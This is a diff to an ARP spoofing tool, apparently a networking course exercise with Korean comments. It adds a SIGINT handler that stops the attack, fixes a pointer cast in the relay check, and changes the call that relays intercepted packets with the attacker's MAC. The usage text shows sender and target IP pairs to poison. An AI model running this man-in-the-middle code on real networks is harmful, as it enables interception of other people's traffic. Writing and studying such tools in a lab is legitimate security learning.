@@ -7,6 +7,7 @@ typedef struct PacketInfo
 } Info;
 
 void usage();
+void sigint_handler(int signo);
 void check_mac(pcap_t *handle, Ip ip, Mac mac);
 void get_mydevice(char *dev, Mac *mymac, Ip *myip);
 void send_arp_packet(Mac packet_eth_dmac, Mac packet_eth_smac, int arphdr_option, Mac packet_arp_smac, Ip packet_arp_sip, Mac packet_arp_tmac, Ip packet_arp_tip, pcap_t *handle);
@@ -204,11 +205,11 @@ void infect_2(pcap_t *handle)
             //relay 필요하면 보내기
             if (check_relay(Ethpacket, iter))
             {
-                printf("relay 실행:) \n");
+                //printf("relay 실행:) \n");
                 EthIpPacket *packet =  (EthIpPacket*) Ethpacket;
                 packet->eth_.smac_ = attacker_mac;
                 packet->eth_.dmac_ = iter.target_mac;
-                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(header->len));
+                int res = pcap_sendpacket(handle, replyPacket, (header->len));
                 if (res != 0)
                 {
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -236,13 +237,15 @@ int check_recover(EthHdr *Ethpacket, Info info)
 
 int check_relay(EthHdr *Ethpacket, Info info)
 {
+
     if(Ethpacket->type() != EthHdr::Ip4)
         return 0;
     
-    EthIpPacket *packet =  (EthIpPacket*) packet;
+    EthIpPacket *packet =  (EthIpPacket*) Ethpacket;
     if((packet->eth_.smac() == info.sender_mac) && packet->ip_.dip != attacker_Ip)
         return 1;
-
+    //if((packet->eth_.smac() == info.sender_mac))
+        //return 1;
     else
         return 0;
 
@@ -278,8 +281,16 @@ Mac get_mac(pcap_t *handle, Ip Ip)
     }
 }
 
+void sigint_handler(int signo)
+{
+    printf("공격 종료 합니다\n");
+    thread = 0;
+    signal(SIGINT, SIG_DFL);
+}
+
 void usage()
 {
     printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
     printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
 }
+
